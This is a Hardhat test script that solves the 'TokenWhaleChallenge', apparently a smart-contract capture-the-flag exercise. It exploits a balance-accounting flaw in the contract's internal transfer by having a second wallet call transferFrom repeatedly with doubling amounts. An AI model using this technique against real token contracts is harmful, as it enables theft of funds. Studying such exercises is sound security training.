const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "TokenWhaleChallenge";

describe.only(NAME, function () {
    describe("exploit", async function () {
        let victimContract;

        it("conduct your attack here", async function () {
            const [owner, attackerWallet1, attackerWallet2] = await ethers.getSigners();
            const VictimFactory = await ethers.getContractFactory(NAME);
            victimContract = await VictimFactory.deploy(attackerWallet1.address);



            //internal _transfer is modifying msg.sender instead of 'from' balance, results in exploit from transferFrom
            victimContract.connect(attackerWallet1).approve(attackerWallet2.address, ethers.constants.MaxUint256);
            let balance = 1000;
            while(await victimContract.isComplete() == false) {
                console.log(balance);
                victimContract.connect(attackerWallet2).transferFrom(attackerWallet1.address, attackerWallet1.address, balance);
                balance *= 2;
            }
        });

        after(async function () {
            expect(await victimContract.isComplete()).to.be.equal(true);
        });
    });
});